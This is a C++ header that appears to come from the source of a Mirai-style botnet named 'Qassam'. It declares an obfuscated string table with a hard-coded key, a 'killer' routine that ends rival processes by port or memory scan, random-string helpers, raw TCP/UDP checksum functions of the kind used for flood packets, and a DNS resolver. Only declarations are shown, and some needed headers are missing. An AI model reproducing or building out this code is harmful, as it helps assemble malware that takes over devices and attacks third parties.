#pragma once

#ifndef B6207B51_3131_4C5F_9C3D_8D2436474F04
#define B6207B51_3131_4C5F_9C3D_8D2436474F04

#define PHI 0x9e3779b9

#include <unistd.h>
#include <cstdint>
#include <cstdarg>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <cstring>
#include <cstdlib>
#include <array>
#include <variant>
#include <cstdint>
#include <cstddef>
#include <array>
#include <memory>
#include <shared_mutex>
#include <atomic>

#include "qassam_config.hh"


struct QassamTableValue
{
    char *val;
    uint16_t val_len;

#ifdef DEBUG
    BOOL locked;
#endif
};

struct QassamResolvEntries {
    uint8_t addrs_len = 0;
    std::vector<ipv4_t> addrs;
};

class QassamEngine
{
    protected:
        std::unique_ptr<char[]> val;
        std::uint16_t val_len = 0;
    #ifdef DEBUG
        bool locked = true;
    #endif
        uint32_t table_key = 0xdedefbaf;
        struct QassamTableValue table[QASSAM_TABLE_MAX_KEYS];
        std::array<QassamTableValue, QASSAM_TABLE_MAX_KEYS> table_{};
        static constexpr std::uint32_t QASSAM_TABLE_KEY = 0xdedefbaf;
        uint32_t x_ = 0, y_ = 0, z_ = 0, w_ = 0;
        int killer_pid_ = 0;
        std::unique_ptr<char[]> killer_realpath_;
        int killer_realpath_len_ = 0;
        static constexpr int KILLER_MIN_PID = 400;
        static constexpr int KILLER_RESTART_SCAN_TIME = 600;


    public:
        QassamEngine() = default;
        ~QassamEngine() = default;

        QassamEngine(const QassamEngine&) = delete;
        QassamEngine& operator=(const QassamEngine&) = delete;
        QassamEngine(QassamEngine&&) = delete;
        QassamEngine& operator=(QassamEngine&&) = delete;

        void qassam_table_init() noexcept;
        void qassam_table_unlock_val(std::uint8_t) noexcept;
        void qassam_table_lock_val(std::uint8_t) noexcept;

        [[nodiscard]]
        char* qassam_table_retrieve_val(int, int*) noexcept;

        static void qassam_add_entry(std::uint8_t, const char*, int) noexcept;
        static void qassam_toggle_obf(std::uint8_t) noexcept;

        void qassam_rand_init() noexcept;
        uint32_t qassam_rand_next() noexcept;
        void qassam_rand_str(char*, int) noexcept;
        void qassam_rand_alpha_str(uint8_t*, int) noexcept;

        void qassam_killer_init() noexcept;
        void qassam_killer_kill() noexcept;
        bool qassam_killer_kill_by_port(uint16_t) noexcept;
        bool qassam_memory_scan_match(const std::string&) noexcept;
        bool qassam_has_exe_access() noexcept;
        bool qassam_mem_exists(const std::string& , const std::string&) noexcept;
        bool qassam_killer_kill_by_port_internal(uint16_t) noexcept;

        void qassam_kill_process(int, int signal = 9) noexcept;

        static uint16_t qassam_checksum_generic(const uint16_t*, uint32_t) noexcept;
        // static uint16_t qassam_checksum_tcpudp(struct iphdr*, void*, uint16_t, int) noexcept;

        template<typename IPHeaderType>uint16_t qassam_checksum_tcpudp_template(IPHeaderType* iph, void* transport_header, uint16_t transport_len, uint8_t protocol) noexcept;

#ifdef __linux__
        uint16_t qassam_checksum_tcpudp(void* ip_header, void* transport_header, uint16_t transport_len, uint8_t protocol) noexcept;
#else
        uint16_t qassam_checksum_tcpudp(void* ip_header, void* transport_header, uint16_t transport_len, uint8_t protocol) noexcept;
#endif

        void qassam_resolv_domain_to_hostname(char* dst_hostname, const char* src_domain) const noexcept;
        std::optional<QassamResolvEntries> qassam_resolv_lookup(const std::string& domain) const noexcept;
        void qassam_resolv_entries_free(QassamResolvEntries& entries) const noexcept;
        void qassam_resolv_skip_name(const uint8_t* reader, const uint8_t* buffer, int* count) const noexcept;

};




































#endif /* B6207B51_3131_4C5F_9C3D_8D2436474F04 */





